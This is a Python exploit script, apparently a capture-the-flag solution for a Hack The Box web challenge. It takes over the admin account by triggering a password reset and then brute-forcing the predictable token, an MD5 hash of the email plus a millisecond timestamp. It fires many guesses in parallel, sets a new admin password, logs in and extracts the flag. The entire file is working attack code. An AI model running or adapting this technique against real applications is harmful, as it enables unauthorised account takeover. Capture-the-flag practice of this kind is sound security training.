import requests
import hashlib
import time
import concurrent.futures
import re
from bs4 import BeautifulSoup

TARGET = "http://94.237.55.96:34265"
ADMIN_EMAIL = "admin@hackthebox.com"
ADMIN_PASSWORD = "11"  # Your desired new password


def generate_token(email, timestamp):
    """Generates the token using email and timestamp."""
    seed = email + str(timestamp)
    return hashlib.md5(seed.encode()).hexdigest()


def try_reset_token(token):
    """Attempts to reset the password with the given token."""
    try:
        # Prepare the request payload with only the newPassword field
        data = {
            "email": ADMIN_EMAIL,
            "token": token,
            "newPassword": ADMIN_PASSWORD,  # Only the new password field
        }
        
        # Send POST request to reset password
        response = requests.post(f"{TARGET}/api/reset-password", json=data)
        
        # Check if the reset was successful
        if response.status_code == 200:
            response_json = response.json()
            if "success" in response_json and response_json["success"]:
                print(f"[+] Success! Token: {token}")
                print(f"[+] New admin password: {ADMIN_PASSWORD}")
                return True
            else:
                print(f"[-] Failed: Token {token} is invalid or expired.")
                return False
        else:
            print(f"[-] Error: HTTP {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        # Catch HTTP request-related errors
        print(f"[-] Error during request: {str(e)}")
        return False
    except Exception as e:
        # Catch any other unexpected errors
        print(f"[-] Unexpected error: {str(e)}")
        return False


def get_flag():
    """Attempts to login and fetch the flag."""
    print("[*] Attempting to login as admin...")
    session = requests.Session()

    # Login
    login_data = {"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD}
    login_response = session.post(f"{TARGET}/api/login", json=login_data)

    try:
        login_json = login_response.json()
        if not login_json.get("success"):
            print("[-] Login failed!")
            print(f"Login response: {login_json}")
            return

        print("[+] Successfully logged in as admin!")

        # Get the dashboard page with session cookie
        print("[*] Fetching dashboard...")
        dashboard_response = session.get(f"{TARGET}/dashboard", allow_redirects=True)

        # Print response headers and cookies for debugging
        print(f"[*] Response status: {dashboard_response.status_code}")
        print(f"[*] Response headers: {dict(dashboard_response.headers)}")
        print(f"[*] Session cookies: {dict(session.cookies)}")

        # Print and parse the response content
        content = dashboard_response.text
        print(f"[*] Dashboard content:\n{content}")

        # Look for flag in the content
        flag_match = re.search(r"HTB\{[^}]+\}", content)
        if flag_match:
            flag = flag_match.group(0)
            print(f"[+] Flag found: {flag}")
            return

        # If no flag found in raw content, try parsing HTML
        soup = BeautifulSoup(content, "html.parser")
        for text in soup.stripped_strings:
            flag_match = re.search(r"HTB\{[^}]+\}", text)
            if flag_match:
                flag = flag_match.group(0)
                print(f"[+] Flag found: {flag}")
                return

        print("[-] Could not find flag in dashboard content")
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        if hasattr(e, "response"):
            print(f"[-] Response content: {e.response.text}")


def main():
    print("[*] Starting password reset token bruteforce...")

    # First trigger a password reset
    print("[*] Triggering password reset for admin...")
    requests.post(f"{TARGET}/api/forgot-password", json={"email": ADMIN_EMAIL})

    # Get current timestamp
    current_time = int(time.time() * 1000)  # Convert to milliseconds

    # Try tokens within a 20-second window (10 seconds before and after)
    window = 20000  # 20 seconds in milliseconds
    timestamps = range(current_time - window, current_time + window, 1)

    print("[*] Generating and testing tokens...")
    tokens = [generate_token(ADMIN_EMAIL, ts) for ts in timestamps]

    # Try tokens in parallel
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        for success in executor.map(try_reset_token, tokens):
            if success:
                print("[+] Attack successful!")
                # Try to get the flag after successful password reset
                get_flag()
                return

    print("[-] Attack failed. Try again with a different time window.")


if __name__ == "__main__":
    main()
